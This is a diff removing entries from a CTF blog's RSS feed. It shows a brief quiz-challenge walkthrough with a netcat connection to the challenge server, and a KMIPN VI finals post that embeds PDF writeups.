-            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
-        </div>
-        <div class="details-content">
-            <div class="admonition-content"><p>My teacher assigned me this quiz and told me that I have to answer each question correctly otherwise I won&rsquo;t be able to pass the test. Can you help me? Pwease</p>
-<p>Author: @5h1kh4r</p>
-<p>nc 34.16.207.52 12345</p>
-</div>
-        </div>
-    </div>
-<h3 id="solve-walkthrough">Solve Walkthrough</h3>
-<ul>
-<li>Just answer all the questions after making a connection.</li>
-<li>ChatGPT was helped me a lot. 😂</li>
-</ul>
-<p></p>]]></description>
-</item>
-<item>
-    <title>(PDF) KMIPN VI CTF Finals Writeup</title>
-    <link>https://whyuhurtz.me/2024/07/pdf-kmipn-vi-ctf-finals-writeup/</link>
-    <pubDate>Fri, 05 Jul 2024 00:00:00 &#43;0000</pubDate>
-    <author>wahyupriambodo.sec@gmail.com (whyuhurtz)</author>
-    <guid>https://whyuhurtz.me/2024/07/pdf-kmipn-vi-ctf-finals-writeup/</guid>
-    <description><![CDATA[My team got 4th position at this competition.
-<h1 id="jeopardy-writeup-by-keito">Jeopardy Writeup by KEITO</h1>
-<div class="details admonition info">
-        <div class="details-summary admonition-title">
-            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
-        </div>
-        <div class="details-content">
-            <div class="admonition-content"><iframe
-  src="https://mozilla.github.io/pdf.js/web/viewer.html?file=https://raw.githubusercontent.com/whyuhurtz/hugo-blog/main/assets/pdf/KMIPNVI-KEITO_Jeopardy.pdf"
-  width="100%"
-  height="600px"
-  style="border: none;">
-</iframe>
-</div>
-        </div>
-    </div>
-<hr>
-<h1 id="boot2root-writeup-by-aezakmi">Boot2Root Writeup by Aezakmi</h1>
-<div class="details admonition info">
-        <div class="details-summary admonition-title">
-            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
-        </div>
-        <div class="details-content">
-            <div class="admonition-content"><iframe
-  src="https://mozilla.github.io/pdf.js/web/viewer.html?file=https://raw.githubusercontent.com/whyuhurtz/hugo-blog/main/assets/pdf/KMIPNVI-Aezakmi_Boot2Root.pdf"
-  width="100%"
-  height="600px"
-  style="border: none;">
-</iframe>
-</div>
-        </div>
-    </div>]]></description>
 </item>
 </channel>
 </rss>
